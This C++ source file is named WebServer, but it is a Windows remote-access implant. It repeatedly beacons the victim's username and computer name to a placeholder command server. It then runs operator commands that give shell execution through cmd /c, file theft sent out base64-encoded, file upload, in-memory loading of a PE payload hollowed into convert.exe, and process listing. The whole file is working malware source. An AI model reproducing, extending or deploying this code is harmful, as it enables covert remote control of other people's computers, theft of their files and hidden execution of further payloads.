#include "WebServer.h"
#include <stdio.h>
#include <winsock.h>
#include <stdlib.h>
#include <Shlwapi.h>
#include <tlhelp32.h>
#include <vector>
#include <mutex>

#include "../../Common/JSON/json.hpp"
#include "../../Common/base64/base64.h"
#include "../../Common/ExecCmd/ExecCmd.h"

#pragma comment (lib, "Ws2_32.lib")
#pragma comment(lib, "Shlwapi.lib")

struct server_info {
	std::string host;
	int port;
	std::string command;
};

int iSleep = 2000;//milisecond
#define MAX_LEN 256
std::vector<std::string> vt_buf;

std::mutex get_mutex;
std::mutex add_mutex;
std::mutex sleep_mutex;

char *ReadFile(const char * file, LPDWORD size)
{
	HMODULE hModule = NULL;
	FILE *fFile;
	long lSize;
	char *buf = NULL;
	size_t result;

	fFile = fopen(file, "rb");
	if (fFile)
	{
		fseek(fFile, 0, SEEK_END);
		lSize = ftell(fFile);
		*size = lSize;
		rewind(fFile);

		buf = (char*)calloc(lSize, 1);
		if (buf)
		{
			result = fread(buf, 1, lSize, fFile);
			if (result != lSize)
			{
				printf("Reading file failed.");
				free(buf);
				buf = NULL;
				*size = 0;
			}
		}
		else
			printf("calloc failed.");
	}
	else
		printf("Can't open file, error %d.", GetLastError());

	return buf;
}

void WriteFile(const char *file, char* buf, DWORD size)
{
	FILE *fo = fopen(file, "wb");
	if (fo)
	{
		fwrite(buf, size, 1, fo);

		fclose(fo);
	}
}

std::string urlencode(std::string data)
{
	char lookup[] = "0123456789abcdef";

	for (int i = 0; i < data.length(); i++)
	{
		char c = data[i];
		if (!((48 <= c && c <= 57) ||//0-9
			(65 <= c && c <= 90) ||//abc...xyz
			(97 <= c && c <= 122) || //ABC...XYZ
			(c == '-' || c == '_' || c == '.' || c == '~'))
			)
		{
			std::string str = "";
			str = str + "%" + lookup[(c & 0xF0) >> 4] + lookup[(c & 0x0F)];
			data.replace(i, 1, str);
		}
	}

	return data;
}

void WINAPI Interface(LPVOID lpParam)
{
	server_info *sv = (server_info*)lpParam;
	//char buffer[10000] = { 0 };
	//setvbuf(stdout, buffer, _IOFBF, 10000);

	using json = nlohmann::json;
	SOCKET s = INVALID_SOCKET;

	WSADATA WSA;
	WSAStartup(MAKEWORD(2, 2), &WSA);

	struct hostent *server = gethostbyname(sv->host.c_str());
	if (server == NULL)
	{
		printf("ERROR, no such host [%s]", sv->host.c_str());
	}
	else
	{
		struct in_addr sin_addr;
		memcpy((char *)&sin_addr.s_addr,
			(char *)server->h_addr,
			server->h_length);
		struct sockaddr_in serv_addr = { 0 };

		s = socket(AF_INET, SOCK_STREAM, IPPROTO_IP);
		if (s == INVALID_SOCKET)
		{
			//DERROR(COMMERROR_SOCK_CODE, sockerror);
			printf("ERROR, socket\n");
		}
		else
		{
			serv_addr.sin_family = AF_INET;
			serv_addr.sin_addr = sin_addr;
			serv_addr.sin_port = htons(sv->port);

			if (connect(s, (struct sockaddr*)&serv_addr, sizeof(serv_addr)) < 0)
			{
				printf("Connect to server failed %d", GetLastError());
				closesocket(s);
				s = INVALID_SOCKET;
			}
			else
			{
				int iResult = send(s, sv->command.c_str(), strlen(sv->command.c_str()), 0);
				Sleep(100);
				fd_set fd_read;

				FD_ZERO(&fd_read);
				FD_SET(s, &fd_read);

				//timeval tv;
				//tv.tv_sec = 0;
				//tv.tv_usec = 100;

				select(0, &fd_read, NULL, nullptr, nullptr);
				if (FD_ISSET(s, &fd_read))
				{
					u_long sztBuf;
					ioctlsocket(s, FIONREAD, &sztBuf);

					if (sztBuf != 0)
					{
						char * pBuf = (char*)calloc(sztBuf + 1, 1);
						std::string str_res = "";
						while (iResult = recv(s, pBuf, sztBuf, 0))
						{
							str_res += std::string(pBuf);
							//puts(pBuf);
							memset(pBuf, 0, sztBuf);
						}

						char *res = strstr((char*)str_res.c_str(), "\r\n\r\n");
						res += strlen("\r\n\r\n");
						str_res = std::string(res);
						if (str_res == "Add OK" || str_res == "Update OK" || str_res == "Response OK")
						{
							//printf("Nothing\n");
						}
						else
						{
							json res_json = json::parse(str_res.c_str());
							int id = res_json["id"].get<int>();
							std::string command = res_json["command"].get<std::string>();
							std::string command_type = command.substr(0, command.find(" "));
							std::string command_params = command.substr(command.find(" ") + 1);
							std::string ret = "";
							std::string buffile = "";
							std::string name = "";
							if (command_type == "shell")
							{
								command_params = "cmd /c " + command_params;

								ret = ExecCmd(command_params);
							}
							else if (command_type == "sleep")
							{
								BOOL key = TRUE;
								for (int i = 0; i < command_params.length(); i++)
								{
									if (!(48 <= command_params[i] && command_params[i] <= 57))
									{
										key = FALSE;
										ret = "Command syntax error.";
									}
								}
								if (key)
								{
									int seconds = std::stoi(command_params, nullptr, 0);
									//std::lock_guard<std::mutex> guard(sleep_mutex);
									sleep_mutex.lock();
									iSleep = 1000 + seconds * 1000;
									sleep_mutex.unlock();
									ret = "sleep " + command_params + "s";
								}
							}
							else if (command_type == "download")
							{
								DWORD file_size = 0;
								char *buf_file = ReadFile(command_params.c_str(), &file_size);
								if (buf_file)
								{
									int base64_len;
									if (file_size % 3)
										base64_len = (file_size / 3 + 1) * 4;
									else
										base64_len = (file_size / 3) * 4;
									char *base64 = (char*)calloc(base64_len + 1, 1);
									if (base64)
									{
										base64_encode((BYTE*)buf_file, (BYTE*)base64, file_size, 0);
										buffile = buffile + (std::string)base64;
										name = name + std::string(PathFindFileNameA(command_params.c_str()));
										ret = "download completed.";

										free(base64);
									}

									free(buf_file);
								}
							}
							else if (command_type == "upload")
							{
								std::string base64 = res_json["buf"].get<std::string>();
								char* buf = (char*)calloc(base64.length() + 1, 1);
								if (buf)
								{
									size_t buf_len = base64_decode((BYTE*)base64.c_str(), (BYTE*)buf, base64.length());
									std::string file = "";
									file += "./" + command_params;
									WriteFile(file.c_str(), buf, buf_len);

									ret = "upload completed.";
									free(buf);
								}
							}
							else if (command_type == "load")
							{
								std::string base64 = res_json["buf"].get<std::string>();
								char *base_exe = (char*)calloc((base64.length()/4)*3 + 1, 1);
								if (base_exe)
								{
									DWORD size = base64_decode((BYTE*)base64.c_str(), (BYTE*)base_exe, base64.length());

									BOOL IsWow64;
									IsWow64Process(GetCurrentProcess(), &IsWow64);
									if(IsWow64)
										ret = ExecPE("C:\\Windows\\SysWOW64\\convert.exe", "C:\\Windows\\SysWOW64\\convert.exe", base_exe, size);
									else
										ret = ExecPE("C:\\Windows\\System32\\convert.exe", "C:\\Windows\\System32\\convert.exe", base_exe, size);

									free(base_exe);
								}
							}
							else if (command_type == "ps")
							{
								ret = GetProcessesList();
							}
							else if (command_type == "cd")
							{
								if (command_params[1] == ':' && command_params[2] == '\\')
									SetCurrentDirectoryA(command_params.c_str());
								else
								{
									char current_path[MAX_PATH];
									GetCurrentDirectoryA(MAX_PATH, current_path);
									command_params = "\\" + command_params;
									strcat(current_path, command_params.c_str());
									SetCurrentDirectoryA(current_path);
								}
							}
							else
								ret = "Command not found.";

							if (ret == "")
							{
								//ret = std::string(buffer);
							}

							int base64_len;
							if (ret.length() % 3)
								base64_len = (ret.length() / 3 + 1) * 4;
							else
								base64_len = (ret.length() / 3) * 4;
							char *base64 = (char*)calloc(base64_len + 1, 1);
							if (base64)
							{
								base64_encode((BYTE*)ret.c_str(), (BYTE*)base64, ret.length(), 0);
								std::string str = (std::string)base64;
								std::string json_data = "";
								json_data += "{"\
									"\"id\": " + std::to_string(id) + ","\
									"\"buf\": \"" + buffile + "\","\
									"\"name\": \"" + name + "\","\
									"\"ret\": \"" + str + "\""\
									"}";

								std::lock_guard<std::mutex> guard(add_mutex);
								//add_mutex.lock();
								vt_buf.push_back("POST /response HTTP/1.0\r\n"
									"Content-Type: application/json\r\n"
									"Content-Length: " + std::to_string(json_data.length()) + "\r\n"
									"\r\n"
									+ json_data + "\r\n");
								//add_mutex.unlock();

								free(base64);
							}
						}



						free(pBuf);
					}
				}
			}
		}

		//clean up
		closesocket(s);
		WSACleanup();
	}
}

void WINAPI WebServer()
{
	//PARAM_WebServer *sv = (PARAM_WebServer *)s;

	server_info server;
	server.host = "[host]";
	server.port = [port];
	while (true)
	{
		std::string command = "";
		std::lock_guard<std::mutex> guard(get_mutex);
		//get_mutex.lock();
		if (vt_buf.empty())
		{
			std::string username = getenv("username");
			std::string computername = getenv("computername");
			command = "GET /request?Username=" + username + "&ComputerName=" + computername + " HTTP/1.0\r\n\r\n";
		}
		else
		{
			command = vt_buf[0];
			vt_buf.erase(vt_buf.begin());
		}
		//get_mutex.unlock();

		server.command = command;

		CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Interface, (LPVOID)&server, 0, 0);
		//Interface((LPVOID)&server);
		
		//printf("OK\n");
		//sleep
		sleep_mutex.lock();
		Sleep(iSleep);	
		sleep_mutex.unlock();
	}	
}

std::string GetProcessesList()
{
	std::string ret = "";
	HANDLE hProcessSnap;
	PROCESSENTRY32 pe32;
	hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hProcessSnap != INVALID_HANDLE_VALUE)
	{
		pe32.dwSize = sizeof(PROCESSENTRY32);
		Process32First(hProcessSnap, &pe32);
		do
		{
			ret += std::to_string(pe32.th32ProcessID) + "       ";
			ret += std::to_string(pe32.th32ParentProcessID) + "       ";
			ret += std::string(pe32.szExeFile) + "\n";

		} while (Process32Next(hProcessSnap, &pe32));
	}
	CloseHandle(hProcessSnap);

	return ret;
}